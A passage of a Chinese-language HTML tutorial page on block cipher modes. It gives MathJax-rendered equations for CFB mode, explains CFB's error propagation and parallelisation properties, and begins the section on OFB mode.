-9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container><br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="28.45ex" height="2.361ex" role="img" focusable="false" viewBox="0 -749.5 12574.8 1043.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(1059.1, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2114.9, 0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(2795.9, 0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="msub" transform="translate(3440.9, 0)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="TeXAtom" transform="translate(759, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(429, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1207, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5435, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(5713, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(5991, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(715, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(412, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1190, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7951, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(8395.7, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(9173.4, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(10229.2, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(10919, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(11974.8, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container><br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.016ex" xmlns="http://www.w3.org/2000/svg" width="37.918ex" height="3.163ex" role="img" focusable="false" viewBox="0 -949 16759.9 1398"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(1589.1, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2644.9, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(3867.9, 0)"><path data-c="2A01" d="M668 944Q697 949 744 949Q803 949 814 948Q916 937 1006 902T1154 826T1262 730T1336 638T1380 563Q1454 415 1454 250Q1454 113 1402 -14T1258 -238T1036 -391T755 -449Q608 -449 477 -392T255 -240T110 -16T56 250Q56 387 105 510T239 723T434 871T668 944ZM706 299V850H704Q519 832 386 725T198 476Q181 433 169 379T156 300Q156 299 431 299H706ZM1116 732Q1054 778 982 807T871 842T810 849L804 850V299H1079Q1354 299 1354 300Q1354 311 1352 329T1336 402T1299 506T1228 620T1116 732ZM706 -350V201H431Q156 201 156 200Q156 189 158 171T174 98T211 -6T282 -120T395 -232Q428 -257 464 -277T527 -308T587 -328T636 -339T678 -346T706 -350ZM1354 200Q1354 201 1079 201H804V-350Q808 -349 838 -345T887 -338T940 -323T1010 -295Q1038 -282 1067 -265T1144 -208T1229 -121T1301 0T1349 158Q1354 188 1354 200Z"></path></g><g data-mml-node="mi" transform="translate(5545.5, 0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(6596.5, 0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="msub" transform="translate(7241.5, 0)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(759, -150) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mo" transform="translate(8382.2, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(8771.2, 0)"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(738, -150) scale(0.707)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g><g data-mml-node="mo" transform="translate(10187.8, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(10576.8, 0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(11358.1, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11747.1, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(12136.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(12580.8, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(13358.6, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(14414.3, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(15104.1, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(16159.9, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></p>
<p>CFB模式采用的是密文反馈，故若某个密文分组在传输中出现一位或多位错误，将会引起当前分组和后续部分分组的解密错误。一个密文分组出错会影响最多[b/s]个分组的解密。</p>
<ul>
<li>与CBC相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化，但解密过程是可以并行化的。</li>
<li>适用于每次加密一个小的分组，如一个字符或一个比特，且消息无需进行填充。</li>
</ul>
<h3 id="输出反馈模式（Output-Feedback-Mode）"><a href="#输出反馈模式（Output-Feedback-Mode）" class="headerlink" title="输出反馈模式（Output Feedback Mode）"></a>输出反馈模式（Output Feedback Mode）</h3><p>在CFB中，1位密文的传输错误会影响至少b+1位的明文，这种错误传播的影响对于有些应用来说还是太大了。</p>
